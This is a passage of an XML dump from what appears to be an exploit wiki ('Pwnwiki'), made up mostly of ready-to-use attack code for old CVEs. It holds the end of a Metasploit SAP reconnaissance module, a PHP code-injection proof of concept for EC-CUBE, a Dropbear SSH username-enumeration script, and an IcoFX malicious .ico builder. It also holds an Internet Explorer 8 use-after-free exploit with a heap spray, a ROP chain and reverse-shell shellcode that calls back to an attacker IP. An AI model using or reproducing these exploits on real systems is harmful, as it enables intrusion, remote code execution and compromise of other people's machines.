					'Header'    =&gt; "Network Port Listing",
					'Prefix'  =&gt; "\n",
					'Postfix' =&gt; "\n",
					'Indent'    =&gt; 1,
					'Columns'   =&gt;
						[	"ID",
						     "PacketsIn",
						     "PacketsOut",
						     "ErrorsIn",
						     "ErrorsOut",
						     "Collisions"
						])

				mxml = REXML::Document.new(res.body)

				itsamcs = mxml.elements.to_a("//mProperties/") # OS info

				itsam = mxml.elements.to_a("//item/mProperties/") # all other info


				itsamcs.each { |name|
					tbl =[]
					body = []
					body = "#{name}"
					env = body.scan(/&lt;item&gt;&lt;mName&gt;(.+?)&lt;\/mName&gt;&lt;mType&gt;(.+?)&lt;\/mType&gt;&lt;mValue&gt;(.+?)&lt;\/mValue&gt;&lt;\/item&gt;/ix)

					if env

						totalitems +=1

						case "#{env}"
							when /ITSAMComputerSystem/

								env.each do |m|
									tbl &lt;&lt; "#{m[2]}" unless ("#{m}" =~ /ITSAM/)
								end

								saptbl[0] &lt;&lt; [ tbl[0], tbl[1], tbl[2]]
								success = true # we have at least one response
						end

					end
				}


				itsam.each { |name|
					tbl =[]
					body = []
					# some items have no &lt;mValue&gt;, so we put a dummy with nil
					body = "#{name}".gsub(/\/mType&gt;&lt;\/item/,"\/mType&gt;&lt;mValue&gt;(nil)&lt;\/mValue&gt;&lt;\/item")
					env = body.scan(/&lt;item&gt;&lt;mName&gt;(.+?)&lt;\/mName&gt;&lt;mType&gt;(.+?)&lt;\/mType&gt;&lt;mValue&gt;(.+?)&lt;\/mValue&gt;&lt;\/item&gt;/ix)

					if env

						totalitems +=1

						env.each do |m|
							tbl &lt;&lt; "#{m[2]}" unless ("#{m}" =~ /ITSAM/)
						end

						case "#{env}"
							when /ITSAMOperatingSystem/
								saptbl[1] &lt;&lt; [ tbl[0], tbl[1], tbl[2], tbl[8], tbl[11],tbl[12],tbl[13],tbl[17],tbl[18]+'%',tbl[19]+'%',tbl[20]+'%']
								success = true # we have at least one response

							when /ITSAMOSProcess/
								saptbl[2] &lt;&lt; [ tbl[0], tbl[1], tbl[2], tbl[3], tbl[4],tbl[5],tbl[6]+'%',tbl[7],tbl[8] ]
								success = true # we have at least one response

							when /ITSAMFileSystem/
								saptbl[3] &lt;&lt; [ tbl[0], tbl[2], tbl[3], tbl[4] ]
								success = true # we have at least one response

							when /ITSAMNetworkPort/
								saptbl[4] &lt;&lt; [ tbl[0], tbl[1], tbl[2], tbl[3], tbl[4], tbl[5] ]
								success = true # we have at least one response
						end

					end
				}

			elsif res and  res.code == 500
				case res.body
					when /&lt;faultstring&gt;(.*)&lt;\/faultstring&gt;/i
						faultcode = $1.strip
						fault = true
				end
			end

		rescue ::Rex::ConnectionError
			print_error("Unable to connect to #{rhost}:#{rport}")
			return
		end

		if success
			print_good("#{totalitems} items listed")

			saptbl.each do |t|
				print(t.to_s)
			end

			p = store_loot(
				"sap.getcomputersystem",
				"text/xml",
				rhost,
				res.body,
				"sap_getcomputersystem.xml",
				"SAP GetComputerSystem XML"
			)
			print_status("Response stored in: #{p}")

			return
		elsif fault
			print_error("#{rhost}:#{rport} - Error code: #{faultcode}")
			return
		else
			print_error("#{rhost}:#{rport} - Failed to parse list")
			return
		end
		return
	end
end

&lt;/pre&gt;</text>
      <sha1>56j8wrmrlu4l6c0ccw574uq01r2u28d</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-3651 LOCKON EC-CUBE 2.11.2 through 2.12.4 PHP代碼注入漏洞</title>
    <ns>0</ns>
    <id>774</id>
    <revision>
      <id>1022</id>
      <timestamp>2021-04-06T02:52:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Usage== &lt;pre&gt; $ python poc_cve_2013_3651.py &lt;Target URL&gt;  - e.g. $ python poc_cve_2013_3651.py http://127.0.0.1:9000/ Result: Vulnerable! &lt;/pre&gt;   ==POC== &lt;pre&gt; import re im..."</comment>
      <origin>1022</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1081" sha1="1x5pjukpb8g25zep9hop57na9r5lla6" xml:space="preserve">==Usage==
&lt;pre&gt;
$ python poc_cve_2013_3651.py &lt;Target URL&gt;

- e.g.
$ python poc_cve_2013_3651.py http://127.0.0.1:9000/
Result: Vulnerable!
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import re
import urllib.request
import sys

args = sys.argv

if len(args) != 2 :
    print ('Using: python poc_cve_2013_3651.py &lt;Target URL&gt;')
    exit()


opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
url = '%s/forgot/' % args[1]

# Get transaction value.
req = urllib.request.Request(url)
res = opener.open(req)
body = res.read().decode('utf-8')
res.close()
transactionid = re.findall(r' name="transactionid" value="([a-z0-9]+)"', body)[0]

# Post Check request.
post_data = urllib.parse.urlencode({
    'transactionid': transactionid,
    'mode': 'mail_check',
    'email': '',
    "name01[system('echo CVE$1_2013_3651')]": '',
    'name02': ''
}).encode('utf-8')

res = opener.open(req, post_data)
body = res.read().decode('utf-8')
res.close()

# print (body)
if re.findall(r'CVE_2013_3651', body) :
    print('Result: Vulnerable!')
else:
    print('Result: Not vulnerable...')

&lt;/pre&gt;</text>
      <sha1>1x5pjukpb8g25zep9hop57na9r5lla6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-3664 Trimble SketchUp任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>775</id>
    <revision>
      <id>1023</id>
      <timestamp>2021-04-06T02:55:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-3664.zip"</comment>
      <origin>1023</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="raxcccvhjo978hqhl2zzvsfsaak54ml" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-3664.zip</text>
      <sha1>raxcccvhjo978hqhl2zzvsfsaak54ml</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-3893 Microsoft Internet Explorer 8 - 'SetMouseCapture ' Use After Free</title>
    <ns>0</ns>
    <id>2397</id>
    <revision>
      <id>2885</id>
      <timestamp>2021-05-17T10:19:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Microsoft Internet Explorer 8 - 'SetMouseCapture ' Use After Free # Date: 15/05/2021 # CVE : CVE-2013-3893 # PoC: https://github.com/travelworld..."</comment>
      <origin>2885</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9061" sha1="4r8qzbz4xyqgamur3t46c00u70atvf9" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Microsoft Internet Explorer 8 - 'SetMouseCapture ' Use After Free
# Date: 15/05/2021
# CVE : CVE-2013-3893
# PoC: https://github.com/travelworld/cve_2013_3893_trigger.html/blob/gh-pages/params.json
# Exploit Author: SlidingWindow
# Vendor Advisory: https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2013/2887505?redirectedfrom=MSDN
# Tested on: Microsoft Internet Explorer 8 (version: 8.0.7601.17514) on Windows 7 SP1 (Version 6.1 Build 7601 SP1)
# Bypasses: DEP, ASLR using MSVCR71.DLL
# Thanks to @corelanc0d3r for awesome Heap Exploitation Training and @offsectraining for OSCP training

&lt;html&gt;
&lt;script&gt;
var spraychunks = new Array();

  // Use BSTR spray since DEPS spray didn't work here
  function heapspray()
  {
    var ropchain = unescape("%u122c%u0c0c"); //EAX now points here. EDX = [EAX+0x70]. So call EDX will take a forward jump to stack-heap flip: 0x7c348b05 :  # XCHG EAX,ESP # RETN 

    //ESP points here after stack-heap flip. jump over padding+stack-heap flip into ROP chain.
    ropchain += unescape("%u6bd5%u7c36");  //0x7c366bd5 :  # ADD ESP,100 # RETN    ** [MSVCR71.dll] **   |   {PAGE_EXECUTE_READ}
    
    //Some padding
    ropchain += unescape("%u6363%u6363%u6464%u6464%u6565%u6565%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565");
    
    //ESP will point to 0x0c0c122c after stack-heap flip.
    ropchain += unescape("%u8b05%u7c34"); //0x7c348b05 :  # XCHG EAX,ESP # RETN    ** [MSVCR71.dll] **   |   {PAGE_EXECUTE_READ}
    
    //More padding for ADD ESP, 100
    ropchain += unescape("%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565%u6565");
    
    //rop chain generated with mona.py - www.corelan.be
    //ropchain needed a little fix

    ropchain += unescape(
      "" + // #[---INFO:gadgets_to_set_ebp:---] : 
      "%u1cab%u7c35" + // 0x7c351cab : ,# POP EBP # RETN [MSVCR71.dll] 
      "%u1cab%u7c35" + // 0x7c351cab : ,# skip 4 bytes [MSVCR71.dll]
      "" + // #[---INFO:gadgets_to_set_ebx:---] : 
      "%u728e%u7c34" + // 0x7c34728e : ,# POP EAX # RETN [MSVCR71.dll] 
      "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
      "%u684b%u7c36" + // 0x7c36684b : ,# NEG EAX # RETN [MSVCR71.dll] 
      "%u1695%u7c37" + // 0x7c371695 : ,# POP EBX # RETN [MSVCR71.dll] 
      "%uffff%uffff" + // 0xffffffff : ,#
      "%u5255%u7c34" + // 0x7c345255 : ,# INC EBX # FPATAN # RETN [MSVCR71.dll] 
      "%u2174%u7c35" + // 0x7c352174 : ,# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [MSVCR71.dll] 
      "" + // #[---INFO:gadgets_to_set_edx:---] : 
      "%u5937%u7c34" + // 0x7c345937 : ,# POP EDX # RETN [MSVCR71.dll] 
      "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
      "%u1eb1%u7c35" + // 0x7c351eb1 : ,# NEG EDX # RETN [MSVCR71.dll] 
      "" + // #[---INFO:gadgets_to_set_ecx:---] : 
      "%u0c81%u7c36" + // 0x7c360c81 : ,# POP ECX # RETN [MSVCR71.dll] 
      "%ucd8c%u7c38" + // 0x7c38cd8c : ,# &amp;Writable location [MSVCR71.dll]
      "" + // #[---INFO:gadgets_to_set_edi:---] : 
      "%u4648%u7c35" + // 0x7c354648 : ,# POP EDI # RETN [MSVCR71.dll] 
      "%ud202%u7c34" + // 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]
      "" + // #[---INFO:gadgets_to_set_esi:---] : 
      "%u50dd%u7c36" + // 0x7c3650dd : ,# POP ESI # RETN [MSVCR71.dll] 
      "%u15a2%u7c34" + // 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]
      "%u5194%u7c34" + // 0x7c345194 : ,# POP EAX # RETN [MSVCR71.dll] 
      // "%ua140%u7c37" + // 0x7c37a140 : ,# ptr to &amp;VirtualProtect() [IAT MSVCR71.dll]
      // "%ua051%u7c37" +  // 7c37a051 + 0xEF should become  0x7c37a140, which is a pointer to &amp;VirtualProtect()
      // Because next instruction adds 0xEF into AL.
      "%ua151%u7c37"  + // 7c37a151 + + 0xEF should become  0x7c37a140, which is a pointer to &amp;VirtualProtect()
      // Because next instruction adds 0xEF into AL.
      "" + // #[---INFO:pushad:---] : 
      "%u8c81%u7c37" + // 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
      "" + // #[---INFO:extras:---] : 
      "%u5c30%u7c34" + // 0x7c345c30 : ,# ptr to 'push esp # ret ' [MSVCR71.dll]
      ""); //  : 

    
    // msfvenom -p windows/shell_reverse_tcp -a x86 lhost=192.168.154.130 lport=4444 -b '\x00' -f js_le
    // First few bytes, %uc481%ufa24%uffff (which is \x81\xc4\x24\xfa\xff\xff # add esp,-1500) move ESP away from EIP to avoid GetPC() routine from corrupting our shellcode

    var shellcode = unescape("%uc481%ufa24%uffff%uccd9%u74d9%uf424%ube5d%uba98%ue3da%uc931%u52b1%u7531%u8317%u04c5%ued03%u38a9%uf116%u3e26%u09d9%u5fb7%uec53%u5f86%u6507%u6fb8%u2b43%u1b35%udf01%u69ce%ud08e%uc767%udfe8%u7478%u7ec8%u87fb%ua01d%u47c2%ua150%ub503%uf399%ub1dc%ue30c%u8f69%u888c%u0122%u6d95%u20f2%u20b4%u7a88%uc316%uf75d%udb1f%u3282%u50e9%uc870%ub0e8%u3148%ufd46%uc064%u3a96%u3b42%u32ed%uc6b0%u81f6%u1cca%u1172%ud66c%ufd24%u3b8c%u76b2%uf082%ud0b0%u0787%u6b14%u8cb3%ubb9b%ud635%u1fbf%u8c1d%u06de%u63fb%u58de%udca4%u137a%u0849%u7ef7%ufd06%u803a%u69d6%uf34c%u36e4%u9be6%ube44%u5c20%u95aa%uf295%u1655%udbe6%u4291%u73b6%ueb33%u835d%u3ebc%ud3f1%u9112%u83b2%u41d2%uc95b%ubedc%uf27b%ud736%u0916%u18d1%u8b4e%uf1a3%uab8d%u5db2%u4d1b%u4dde%uc64d%uf777%u9cd4%uf8e6%ud9c2%u7229%u1ee1%u73e7%u0c8c%u7390%u6edb%u8b37%u06f1%u1edb%ud69e%u0292%u8109%uf5f3%u4740%uacee%u75fa%u29f3%u3dc4%u8a28%ubccb%ub6bd%uaeef%u367b%u9ab4%u61d3%u7462%udb92%u2ec4%ub74c%ua68e%ufb09%ub010%ud615%u5ce6%u8fa7%u63be%u5808%u1c37%uf874%uf7b8%u083c%u55f3%u8114%u0c5a%ucc24%ufb5c%ue96b%u09de%u0e14%u78fe%u4a11%u91b8%uc36b%u952d%ue4d8%u4167"); 

    var junk = unescape("%u2020%u2020");  
    while (junk.length &lt; 0x4000) junk += junk;
    offset = 0x204/2 ; //0c0c1228
    var junk_front = junk.substring(0,offset);
    var junk_end = junk.substring(0,0x800 - junk_front.length - ropchain.length - shellcode.length)
    var smallblock = junk_front + ropchain + shellcode + junk_end;

    
    var largeblock = "";
    while (largeblock.length &lt; 0x80000) { largeblock = largeblock + smallblock; }

    // make allocations
    for (i = 0; i &lt; 0x450; i++) { spraychunks[i] = largeblock.substring(0, (0x7fb00-6)/2);  }
    
  }
  
  function alloc(nr_alloc){
    for (var i=0; i &lt; nr_alloc; i++){
      divobj = document.createElement('div');
      // Allocate 0x25 (37 decimal) bytes.  Vulnerable object size = 0x4c bytes
      divobj.className = "\u1228\u0c0c\u4141\u4141\u4242\u4242\u4343\u4343\u4444\u4444\u4545\u4545\u4646\u4646" + 
                       "\u4747\u4747\u4848\u4949\u4949\u5050\u5050\u5151\u5151\u5252\u5252\u5353\u5353\u5454" +
                       "\u5454\u5555\u5555\u5656\u5656\u5757\u5757\u5858\u5858";
    }
  }

  heapspray();
  
  function trigger()
  {
    var id_0 = document.createElement("sup");
    var id_1 = document.createElement("audio");

    heapspray();
    document.body.appendChild(id_0);
    document.body.appendChild(id_1);
    id_1.applyElement(id_0);

    id_0.onlosecapture=function(e) {
    //Vulnerable Object is freed here
    document.write("");
    
    //Replace/Reclaim the freed object here. 
    //Object size is 0x4c
    alloc(0x20);
      
    }

    id_0['outerText']="";
    id_0.setCapture();
    id_1.setCapture();
  }

  window.onload = function() {
    trigger();
  }
 
&lt;/script&gt;
&lt;/html&gt;

&lt;!-- Debug: Taking a different code path for this exploit

First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000003 ebx=00000100 ecx=40404040 edx=00000001 esi=0089c098 edi=00000000
eip=7467b68d esp=0301c34c ebp=0301c360 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
mshtml!CElement::Doc:
7467b68d 8b01            mov     eax,dword ptr [ecx]  ds:002b:40404040=????????

0:005&gt; u eip
mshtml!CElement::Doc:
7467b68d 8b01            mov     eax,dword ptr [ecx]
7467b68f 8b5070          mov     edx,dword ptr [eax+70h]
7467b692 ffd2            call    edx
7467b694 8b400c          mov     eax,dword ptr [eax+0Ch]
7467b697 c3              ret
7467b698 90              nop
7467b699 90              nop
7467b69a 90              nop

0:005&gt; ub eip
mshtml!CElement::SecurityContext+0x22:
7467b681 8b01            mov     eax,dword ptr [ecx]
7467b683 8b5070          mov     edx,dword ptr [eax+70h]
7467b686 ffe2            jmp     edx
7467b688 90              nop
7467b689 90              nop
7467b68a 90              nop
7467b68b 90              nop
7467b68c 90              nop
&lt;/pre&gt;</text>
      <sha1>4r8qzbz4xyqgamur3t46c00u70atvf9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-4002 Apache Xerces2 Java Parser拒絕服務漏洞</title>
    <ns>0</ns>
    <id>776</id>
    <revision>
      <id>1024</id>
      <timestamp>2021-04-06T02:57:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-4002.zip"</comment>
      <origin>1024</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="tlb6xiabu3e9n8mvxdoj2l7idob0jp8" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-4002.zip</text>
      <sha1>tlb6xiabu3e9n8mvxdoj2l7idob0jp8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-4348 Linux kernel through 3.12 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>777</id>
    <revision>
      <id>1025</id>
      <timestamp>2021-04-06T02:59:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-4348.zip"</comment>
      <origin>1025</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="5hyig69sxaba0tj9siwjjwfhx55t4fp" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-4348.zip</text>
      <sha1>5hyig69sxaba0tj9siwjjwfhx55t4fp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-4434 Dropbear SSH Server before 2013.59 用戶名泄漏漏洞</title>
    <ns>0</ns>
    <id>778</id>
    <revision>
      <id>1026</id>
      <timestamp>2021-04-06T03:01:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/bin/bash  # Affected Systems: Dropbear SSH Server before 2013.59 # CVE-ID: CVE-2013-4434 # Author: styx00  # Colours &lt;3 RED='\033[0;31m' GREEN='\033[0;32m' BO..."</comment>
      <origin>1026</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2052" sha1="q7xropj8fjvht22ctluj93lg7d389lw" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/bin/bash

# Affected Systems: Dropbear SSH Server before 2013.59
# CVE-ID: CVE-2013-4434
# Author: styx00

# Colours &lt;3
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD=$(tput bold)
RESET=$(tput sgr0)

# Check if 'sshpass' is installed first
dpkg -l "sshpass" &gt; /dev/null 2&gt;&amp;1
INSTALLED=$?

printf "Checking if the 'sshpass' package is installed...\n"
if [ $INSTALLED == '0' ]; then
    printf "${GREEN}${BOLD}[+] The 'sshpass' package is installed. Let's proceed!${RESET}\n\n"
else
    printf "${RED}${BOLD}[-] The 'sshpass' package is not installed.${RESET}\n\n"
    exit 1
fi

# Function to show the script's usage
function usage
{
    printf "Usage: ./dropbear_CVE-2013.sh -t example.com -p 22 -w /home/styx00/usernames.txt"
    printf "\n\t-t, --target\tTarget FQDN or IP address"
    printf "\n\t-p, --port\tPort number"
    printf "\n\t-w, --wordlist\tWordlist containing usernames"
    printf "\n\t-h, --help\tShow help and exit\n"
}

while [ "$1" != "" ]; do
    case $1 in
        -t | --target )         shift
                                target=$1
                                ;;
        -p | --port )           shift
                                port=$1
                                ;;
        -w | --wordlist )       shift
                                wordlist=$1
                                ;;
        -h | --help )           usage
                                exit
                                ;;
        * )                     usage
                                exit 1
    esac
    shift
done

if [ "$target" !=  "" ] &amp;&amp; [ "$port" != "" ] &amp;&amp; [ "$wordlist" != "" ]
then
  printf "Target: %s\n" "${target}"
  printf "port: %s\n" "${port}"
  printf "Wordlist: %s\n" "${wordlist}"

  printf "\nTesting\n---------------\n"

  trap "exit" INT   # Exit on SIGINT
  for username in $(cat $wordlist)
  do
    printf "\n${username}\n\t"
    /usr/bin/time --quiet -f "\tTime: %e" sshpass -p "password" ssh -T $username@$target -p $port &lt;/dev/null
  done
  printf "\n---------------\n"
else
  usage
fi

&lt;/pre&gt;</text>
      <sha1>q7xropj8fjvht22ctluj93lg7d389lw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-4547 Nginx文件名邏輯漏洞</title>
    <ns>0</ns>
    <id>779</id>
    <revision>
      <id>1027</id>
      <timestamp>2021-04-06T03:02:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-4547.zip"</comment>
      <origin>1027</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="h0l4nqwdvjgu6qqhnt3awefkmjzmd7e" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-4547.zip</text>
      <sha1>h0l4nqwdvjgu6qqhnt3awefkmjzmd7e</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-4988 IcoFX 2.6 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>3647</id>
    <revision>
      <id>4232</id>
      <timestamp>2021-06-07T12:13:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: IcoFX 2.6 - '.ico' Buffer Overflow SEH + DEP Bypass using JOP # Date: 2020-05-20 # Exploit Author: Austin Babcock # Vendor Homepage: https://ico..."</comment>
      <origin>4232</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6752" sha1="o8v39hzeyu4r12y9kuv4v0qkm3ubtvh" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: IcoFX 2.6 - '.ico' Buffer Overflow SEH + DEP Bypass using JOP
# Date: 2020-05-20
# Exploit Author: Austin Babcock
# Vendor Homepage: https://icofx.ro/
# Software Link: https://drive.google.com/file/d/1SONzNStA_W3pAPU5IUvsYS3z0jYymEZn/view?usp=sharing
# Version: 2.6.0.0
# Tested on: Windows 7 Ultimate x64
# CVE: CVE-2013-4988
# Steps: 1. Run script 2. Open application 3. Open maliciousJOP.ico via file -&gt; open dropdown menu


# Payload Length: 1626 bytes

#While this is an older CVE, it is very rare to have a JOP chain available for a binary which is what this exploit attempts to demonstrate. 
#Gadgets were found using the JOP ROCKET tool which is available at https://github.com/Bw3ll/JOP_ROCKET

#This exploit utilizes ROP to set up a JOP chain that will perform multiple stack pivots and call VirtualProtect(). 
#JOP utilizes a dispatcher gadget (#add ecx, dword ptr [eax] #jmp dword ptr [ecx]) to executes gadgets found within the dispatch table.
#The ECX register will hold the address of the dispatch table, which will be modified each time the dispatcher gadget executes.
#After each modification, ECX will point to the address of the next gadget in the JOP chain and "jmp dword ptr [ecx]" executes that gadget.
#Each functional gadget must end in a jmp or call to a register containing the address of the dispatcher gadget.
#In this exploit, ecx is used to hold the address of the dispatch table, and edi is used to hold the dispatcher gadget address.
#The dispatch table is located just after the shellcode in this exploit's payload. The address is loaded into ECX using ROP to programatically generate the correct address..

#!/usr/bin/python2
import struct
 
# Stuff we'll need for creating our malicious .ico
header = "\x00\x00\x01\x00\x00\x6F"
option = "\x02\x00\x00\x00"
pad2 = "\x41"*8
nseh = "\xfe\xff\xff\xff"

base = 0x400000
# SEH Overwrite with stack pivot - ADD ESP,0x800 # POP EBX # RET
seh = struct.pack('&lt;L', 0x0044f012)


###########################

#### LOAD DISPATCH TABLE ADDR INTO ECX ####
#The dispatch table's address is calculated based off of the value of EBP, which is related to the paylaod's location in memory.
jopSetup = struct.pack('&lt;I',0x00580ca8) # POP ECX # RETN &lt;- 
jopSetup += struct.pack('&lt;I',0x0000000) #clear ecx
jopSetup += struct.pack('&lt;I', base + 0x000e8643) # ADD ECX,EBP # RETN
jopSetup += struct.pack('&lt;I', base + 0x00007c03) # POP EAX # RETN
jopSetup += struct.pack('&lt;I',0x00009f0) # offset for disp table
jopSetup += struct.pack('&lt;I', base + 0x00007c63) # ADD ECX,EAX # RETN # ecx = disp table

#### LOAD ADD VALUE PTR INTO EAX ####
#Since the dispatcher gadget uses the instruction "add ecx, dword ptr[eax]" to modify the address of the dispatch table,
#eax must point to a valid location in memory containing the value we want to add to ecx each time the dispatcher executes.
#In this case, eax will point to an address containing the value 0x00000004.
jopSetup += struct.pack('&lt;I', base + 0x0029c000) # MOV EAX,ECX # POP ESI # RETN &lt;-
jopSetup += struct.pack('&lt;I',0x0000000) # junk
jopSetup += struct.pack('&lt;I', base + 0x0059d50d) # DEC EAX # RETN
jopSetup += struct.pack('&lt;I', base + 0x0059d50d) # DEC EAX # RETN
jopSetup += struct.pack('&lt;I', base + 0x0059d50d) # DEC EAX # RETN
jopSetup += struct.pack('&lt;I', base + 0x0059d50d) # DEC EAX # RETN

#### LOAD WRITABLE ADDR OFFSET INTO EBX #### 
#The gadget used for stack pivoting has an extra instruction (or byte ptr [ebx - 0x781703bb]) that cannot be avoided. 
#In order to ensure this instruction does not cause problems, ebx-0x781703bb must point to a writable section of memory so
#that the instruction does not cause an access violation. This section makes sure ebx contains a compatible value.
jopSetup += struct.pack('&lt;I', base + 0x00390000) # POP EBX # RETN 
jopSetup += struct.pack('&lt;I', 0x78c0609a) # needed for stack pivot JOP gadget -- offset to writable addr

#### LOAD DISPATCHER ADDR INTO EDI ####
jopSetup += struct.pack('&lt;I',base + 0x00051423) # POP EDI # RETN
jopSetup += struct.pack('&lt;I',base + 0x6d81) # disp gadget address 
#Dispatcher:
#add ecx, dword ptr [eax]   0x406d81 (offset 0x6d81)
#jmp dword ptr [ecx]     

#### BEGIN JOP -- PERFORM STACK PIVOT #### 
jopSetup += struct.pack('&lt;I', base + 0x1623) # JMP EDI
table = struct.pack('&lt;I',0x44444444) # padding
#PIVOT 40 BYTES
#Last POP will put VP ptr in EBP
for i in range(10):
  table += struct.pack('&lt;I', 0x588b9b) #pop ebp # or byte ptr [ebx - 0x781703bb], cl # jmp edi &lt;-

#### CALL VirtualProtect() ####
#The derferencing gadget used to call VirtualProtect() has an offset of -0x71 bytes from ebp.
#To account for this, when the pointer for VirtualProtect() is loaded into ebp, 0x71 bytes are added to it in order
#to ensure that ebp-0x71 is the correct value for the pointer. This can be seen below.
table += struct.pack('&lt;I',0x4c8eb7) #jmp dword ptr [ebp - 0x71] &lt;-
# VP ptr + offset for jmp ebp gadget
vpPtr = struct.pack('&lt;I',0x00bf6668 + 0x71) 

############################################################################################


msg_sc = ("\x31\xD2\xB2\x30\x64\x8B\x12\x8B\x52\x0C\x8B\x52\x1C\x8B\x42\x08\x8B\x72\x20\x8B\x12\x80"
          "\x7E\x0C\x33\x75\xF2\x89\xC7\x03\x78\x3C\x8B\x57\x78\x01\xC2\x8B\x7A\x20\x01\xC7\x31\xED"
          "\x8B\x34\xAF\x01\xC6\x45\x81\x3E\x46\x61\x74\x61\x75\xF2\x81\x7E\x08\x45\x78\x69\x74\x75"
          "\xE9\x8B\x7A\x24\x01\xC7\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01\xC7\x8B\x7C\xAF\xFC\x01\xC7\x68"
          "\x50\x21\x20\x01\x68\x78\x20\x4A\x4F\x68\x49\x63\x6F\x46\x89\xE1\xFE\x49\x0B\x31\xC0\x51"
          "\x50\xFF\xD7")

# ExitProcess(0);
exit_sc = "\x31\xc0\x50\xb8\x00\x60\xbf\x00\xff\x10"


addesp = "\x81\xec\x00\x10\x00\x00" # Stack pivot at start of shellcode
shellcode = addesp + msg_sc + exit_sc
nopwrap = "\x90"*(0x168 - len(shellcode)) + shellcode + "\x90"*0x20


# padding until VP parameter location 
paramPad = "C" *(36)

paramPad += vpPtr

### VIRTUAL PROTECT PARAMETERS ###
vpParams = struct.pack('&lt;I',0x18f744) #return addr
vpParams += struct.pack('&lt;I',0x18f744) #lpAddr
vpParams += struct.pack('&lt;I',0x500) #dwSize
vpParams += struct.pack('&lt;I',0x40) #flNewProt
vpParams += struct.pack('&lt;I',0x00bf4d0a) #lpfOldProtect


# pad1 holds JOP Setup chain, VP() Parameters, Shellcode, Value for ADD, and Dispatch Table
pad1 = "A"*580 + jopSetup + paramPad +  vpParams + nopwrap
addVal = struct.pack('&lt;I',0x00000004) # how much for disp gadget to add to Dispatch Table address
pad1 += addVal
pad1 += table # dispatch table
pad1 += "B"*(0x640-len(pad1))

# Piece together our exploit
payload = header + pad1 + option + pad2 + nseh + seh
